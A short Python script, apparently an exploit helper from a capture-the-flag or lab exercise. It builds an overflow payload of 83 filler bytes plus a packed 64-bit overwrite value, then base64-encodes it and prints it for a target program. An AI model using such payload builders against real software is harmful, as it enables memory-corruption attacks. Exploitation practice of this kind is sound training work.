
import sys
import struct
import base64

buf = b'eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee'
buf += struct.pack('<Q', 14121368064602599120)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
